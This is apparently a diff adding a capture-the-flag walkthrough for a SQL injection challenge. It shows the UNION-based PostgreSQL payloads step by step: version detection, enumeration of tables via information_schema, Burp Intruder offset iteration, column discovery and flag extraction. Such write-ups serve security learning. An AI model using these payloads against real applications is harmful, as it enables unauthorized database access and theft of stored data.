@@ -1,0 +1,22 @@
+1. Enter in a `'` into the searchbar, and you will get an error indicating SQL injection
+2. Using this cheat sheet for a lot of things https://portswigger.net/web-security/sql-injection/cheat-sheet
+3. If you look at the requests with burp, each character is being sent in a new request, but you can send more than one characters if you use the repeater
+4. Getting the version
+    - Trying a UNION attack with all the different db types
+    - Postgres ended up working
+        - a' UNION SELECT version()--
+        - PostgreSQL 16.2 (Debian 16.2-1.pgdg120+2) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit
+5. Finding other tables
+    - UNION attack to get the other tables, postgres queries
+        - a'+UNION+SELECT+table_name+FROM++information_schema.tables--
+            - Only one row is returned at a time, need to use the intruder or make a script
+        - a' UNION SELECT table_name FROM  information_schema.tables LIMIT 1 OFFSET §1§--
+            - Payload type is sniper, numbers 1-200 or some large number
+        - You can also do this
+            - a' UNION SELECT string_agg(table_name, ', ') FROM  information_schema.tables--
+    - You find a table called `flag`
+6. Finding columns
+    - a' UNION SELECT string_agg(column_name, ', ') FROM  information_schema.columns WHERE table_name = 'flag'--
+    - find a column named `flag`
+7. Getting the flag
+    - a' UNION SELECT flag FROM flag--
